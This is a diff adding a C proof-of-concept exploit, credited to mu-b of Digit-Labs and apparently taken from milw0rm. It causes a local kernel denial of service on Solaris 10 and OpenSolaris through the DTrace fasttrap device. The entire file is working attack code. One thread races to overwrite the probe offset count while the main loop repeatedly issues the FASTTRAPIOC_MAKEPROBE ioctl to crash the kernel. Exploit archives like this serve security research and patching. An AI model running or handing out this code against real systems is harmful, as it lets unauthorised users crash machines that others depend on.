@@ -1,0 +1,84 @@
+/* solaris-fasttrap-dos.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * Solaris >= 10/Opensolaris local kernel DoS POC
+ * by mu-b - Wed 19 Nov 2008
+ *
+ * - Tested on:  Sun Solaris 10 (SPARC)
+ *               Sun OpenSolaris <= snv_113 (x86)
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <sys/fasttrap.h>
+#include <unistd.h>
+
+#define DTRACE_FASTTRAP "/devices/pseudo/fasttrap@0:fasttrap"
+
+void *
+hammer (void *addr)
+{
+  fasttrap_probe_spec_t *probe;
+  probe = addr;
+
+  while (1)
+    {
+      probe->ftps_noffs = 1024 * 128;
+      usleep (10);
+    }
+
+  return (NULL);
+}
+
+int
+main (int argc, char **argv)
+{
+  fasttrap_probe_spec_t probe;
+  int i, fd, n, tid;
+
+  printf ("Solaris >= 10/Opensolaris local kernel DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  fd = open (DTRACE_FASTTRAP, O_RDONLY);
+  if (fd < 0)
+    {
+      fprintf (stderr, "failed opening %s\n", DTRACE_FASTTRAP);
+      return (EXIT_FAILURE);
+    }
+
+  memset (&probe, 0, sizeof probe);
+  memset (&probe.ftps_func, 0x41, DTRACE_FUNCNAMELEN-1);
+  memset (&probe.ftps_mod, 0x41, DTRACE_MODNAMELEN-1);
+
+  probe.ftps_type = DTFTP_OFFSETS;
+  probe.ftps_pid = getpid ();
+
+  n = pthread_create (&tid, NULL, hammer, &probe);
+  if (n < 0)
+    {
+      fprintf (stderr, "failed creating hammer thread\n");
+      return (EXIT_FAILURE);
+    }
+
+  for (i = 0; ; i++)
+    {
+      probe.ftps_noffs = 1;
+      n = ioctl (fd, FASTTRAPIOC_MAKEPROBE, &probe);
+
+      if (!(i % 64))
+        printf ("tried: %d-times\r", i);
+    }
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2009-05-04]
